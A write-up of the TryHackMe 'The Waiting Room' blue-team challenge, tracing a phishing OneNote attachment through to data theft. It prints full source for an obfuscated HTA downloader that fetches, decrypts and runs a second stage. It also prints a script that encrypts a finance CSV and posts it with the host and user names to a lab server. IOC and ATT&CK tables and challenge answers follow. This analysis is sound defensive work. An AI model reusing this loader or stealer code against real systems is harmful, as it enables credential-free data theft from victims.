---
title: "The Waiting Room"
description: "A routine supplier email has left Michelle Smith with an attachment that did not open as expected. Examine the correspondence, trace the workstation activity, and determine what happened after she opened it."
publishDate: "2026-10-25"
tags: ["downtime", "medium", "malware", "network", "thm"]
section: "blue"
draft: False
coverImage:
  src: "/images/DownTimeTHM/waiting_room_thumbnail.png"
  alt: "thumbnail"
---
In this write-up, I walk through to a challenge from TryHackMe’s [Downtime](https://tryhackme.com/room/thewaitingroom) event, tracing the attack from a phishing attachment to data exfiltration.
<br>
![sumary](/images/DownTimeTHM/brief.png)

## 1. Attack Chain Analysis
![email](/images/DownTimeTHM/eml.png)
The email contains attachment `Remittance.one` and in this `Microsoft OneNote`, I found suspicious javascript
![hta](/images/DownTimeTHM/malicious_script.png)
```js
var entries = [
    "746a6174750b17617475716d6d69170f1709",
    "6a5a4b50494d50575e177f50555c6a404a4d5c54765b535c5a4d",
    "6e6a5a4b50494d176a515c5555",
    "514d4d4903161649564b4d585517545c4b505d505857174d5154030109010916584a4a5c4d4a164b5c54504d4d58575a5c144f0b1749575e",
    "1c75767a78757869697d786d781c",
    "65745c4b505d505857",
    "654b5c5a5c50494d17534a",
    "7e7c6d",
    "5a4a5a4b50494d175c415c1916167b191616775655565e5619",
    "0a5a0e58015a01010d0f0f5f0c5b010f005b5c58080c5f0a0a0a5c0a5b5c0908",
    "746b140f08090f14090b01"
];

function value(i) {
    var h = entries[i],
        r = "";

    for (var n = 0; n < h.length; n += 2) {
        r += String.fromCharCode(
            parseInt(h.substr(n, 2), 16) ^ 57
        );
    }

    return r;
}

function transform(a, k) {
    var s = [],
        j = 0,
        i,
        t,
        o = [];

    for (i = 0; i < 256; i++) {
        s[i] = i;
    }

    for (i = 0; i < 256; i++) {
        j = (j + s[i] + k[i % k.length]) & 255;

        t = s[i];
        s[i] = s[j];
        s[j] = t;
    }

    i = 0;
    j = 0;

    for (var n = 0; n < a.length; n++) {
        i = (i + 1) & 255;
        j = (j + s[i]) & 255;

        t = s[i];
        s[i] = s[j];
        s[j] = t;

        o.push(a[n] ^ s[(s[i] + s[j]) & 255]);
    }

    return o;
}

function loadReceipt() {
    try {
        var x = new ActiveXObject(value(0)),
            f = new ActiveXObject(value(1)),
            w = new ActiveXObject(value(2));

        x.open(value(7), value(3), false);
        x.send();

        if (x.status != 200) {
            return;
        }

        var b = new VBArray(x.responseBody).toArray(),
            k = [],
            h = value(9);

        for (var i = 0; i < h.length; i += 2) {
            k.push(parseInt(h.substr(i, 2), 16));
        }

        var p = transform(b, k),
            d = w.ExpandEnvironmentStrings(value(4)) + value(5);

        if (!f.FolderExists(d)) {
            f.CreateFolder(d);
        }

        var n = d + value(6),
            s = f.CreateTextFile(n, true, false),
            text = "";

        for (var i = 0; i < p.length; i++) {
            text += String.fromCharCode(p[i]);
        }

        s.Write('var cacheToken="' + h + '";\n' + text);
        s.Close();

        w.Run(
            value(8) + '"' + n + '" ' + value(10),
            0,
            true
        );
    } catch (e) {}

    window.close();
}
```
This script downloads an encrypted payload disguised as PNG file from `http://portal.meridian.thm:8080/assets/remittance-v2.png` then decrypt using `RC4` with the key `3c7a8c88466f5b869bea15f333e3be01` and saves it as `%LOCALAPPDATA%\Meridian\receipt.js` and executes it using `cscript.exe //B //Nologo`, with `MR-6106-028` as an argument.

![pcap](/images/DownTimeTHM/pcap.png)
From `incident.pcap` extracting and decrypt `remittance-v2.png` then we got another js file:
```js
var args = WScript.Arguments;

var shell = new ActiveXObject("WScript." + "Shell"),
    fs = new ActiveXObject("Scripting." + "FileSystemObject");

var source =
    shell.ExpandEnvironmentStrings("%USERPROFILE%") +
    "\\Documents\\Finance\\payment-register.csv";

if (args.length != 1 || !fs.FileExists(source)) {
    WScript.Quit(0);
}

var h = cacheToken,
    k = [];

for (var n = 0; n < h.length; n += 2) {
    k.push(parseInt(h.substr(n, 2), 16));
}

var handle = fs.OpenTextFile(source, 1, false),
    content = handle.ReadAll();

handle.Close();

var input = [];

for (var n = 0; n < content.length; n++) {
    input.push(content.charCodeAt(n) & 255);
}

function transform(a, k) {
    var s = [],
        j = 0,
        i,
        t,
        o = [];

    for (i = 0; i < 256; i++) {
        s[i] = i;
    }

    for (i = 0; i < 256; i++) {
        j = (j + s[i] + k[i % k.length]) & 255;

        t = s[i];
        s[i] = s[j];
        s[j] = t;
    }

    i = 0;
    j = 0;

    for (var n = 0; n < a.length; n++) {
        i = (i + 1) & 255;
        j = (j + s[i]) & 255;

        t = s[i];
        s[i] = s[j];
        s[j] = t;

        o.push(a[n] ^ s[(s[i] + s[j]) & 255]);
    }

    return o;
}

function b64(a) {
    var alphabet =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
        s = "";

    for (var n = 0; n < a.length; n += 3) {
        var v =
            (a[n] << 16) |
            ((a[n + 1] || 0) << 8) |
            (a[n + 2] || 0);

        s +=
            alphabet.charAt((v >>> 18) & 63) +
            alphabet.charAt((v >>> 12) & 63) +
            (n + 1 < a.length ? alphabet.charAt((v >>> 6) & 63) : "=") +
            (n + 2 < a.length ? alphabet.charAt(v & 63) : "=");
    }

    return s;
}

function q(s) {
    return '"' + s.replace(/\\/g, "\\\\").replace(/"/g, '\\"') + '"';
}

var envelope =
    '{"reference":' + q(args.Item(0)) +
    ',"workstation":' + q(shell.ExpandEnvironmentStrings("%COMPUTERNAME%")) +
    ',"user":' + q(shell.ExpandEnvironmentStrings("%USERNAME%")) +
    ',"document":' + q(fs.GetFileName(source)) +
    ',"data":' + q(b64(transform(input, k))) +
    '}';

var request = new ActiveXObject("MSXML2." + "XMLHTTP.6.0");

request.open(
    "POST",
    "http://portal.meridian.thm:8080/api/receipt",
    false
);

request.setRequestHeader("Content-Type", "application/json");
request.send(envelope);
```
The script reads `payment-register.csv`, encrypts its contents using `RC4` with previous key, and Base64-encodes the result. It then sends the data, along with the computer name and username, via an HTTP POST request to `http://portal.meridian.thm:8080/api/receipt`.
Extract the data field from the JSON file, decode it from Base64, then decrypt it using RC4 with the hex key 3c7a8c88466f5b869bea15f333e3be01.
![cyberchef](/images/DownTimeTHM/cyberchef.png)

## 2. Indicators of Compromise
| Type | Indicator |
|---|---|
| Domain | `portal[.]meridian[.]thm` |
| Payload URL | `hxxp://portal[.]meridian[.]thm:8080/assets/remittance-v2.png` |
| Exfiltration URL | `hxxp://portal[.]meridian[.]thm:8080/api/receipt` |
| OneNote filename | `Remittance.one` |
| Embedded HTA SHA256 | `e3e53f2e21df0b56eeb62d50146c4d69eb8cbc1bab5b8ba13f8ba5859870f6b3` |
| Dropped file | `%LOCALAPPDATA%\Meridian\receipt.js` |
| RC4 key (hex) | `3c7a8c88466f5b869bea15f333e3be01` |
| Execution argument | `MR-6106-028` |
| Target file | `%USERPROFILE%\Documents\Finance\payment-register.csv` |
## 3. MITRE ATT&CK Mapping

| Technique ID | Technique |
|---|---|
| T1566.001 | Phishing: Spearphishing Attachment |
| T1204.002 | User Execution: Malicious File |
| T1036.002 | Masquerading: Right-to-Left Override |
| T1218.005 | System Binary Proxy Execution: Mshta |
| T1059.007 | Command and Scripting Interpreter: JavaScript |
| T1027 | Obfuscated Files or Information |
| T1140 | Deobfuscate/Decode Files or Information |
| T1105 | Ingress Tool Transfer |
| T1005 | Data from Local System |
| T1041 | Exfiltration Over C2 Channel |
## 4. QnA
### Q1: What is the SHA-256 hash of the embedded attachment that initiated the suspicious activity?
```shell
$ dd if=Remittance.one of=extracted.hta bs=1 skip=$((0x30B4)) count=$((0x74A)) status=none

$ sha256sum extracted.hta
e3e53f2e21df0b56eeb62d50146c4d69eb8cbc1bab5b8ba13f8ba5859870f6b3
```
Answer: `e3e53f2e21df0b56eeb62d50146c4d69eb8cbc1bab5b8ba13f8ba5859870f6b3`
### Q2: Which Unicode code point was used to disguise that attachment’s displayed filename? 
![utf](/images/DownTimeTHM/utf.png)
The UTF-16LE output shows the attachment split into `Remittance_` and `fdp.hta` suggesting a non printable character between them. This is consistent with `Right-to-Left Override` (RLO) filename spoofing: inserting `U+202E` before `fdp.hta` which can make the filename appear as `Remittance_ath.pdf`.
Answer: `U+202E`
### Q3: Which hostname served the downloaded stage?
Answer: `portal.meridian.thm`
### Q4: What was the process ID of the interpreter that executed the downloaded script?
![execute](/images/DownTimeTHM/execute.png)
Answer: `1996`
### Q5: What encryption key protected the document transferred from the workstation?
Answer: `3c7a8c88466f5b869bea15f333e3be01`
### Q6: What is the SHA-256 hash of the document transferred from the workstation?
Answer: `c19c4964c2a77872c49750cc1c2dd443b48fba984b41988aec6fbc780faed09a`




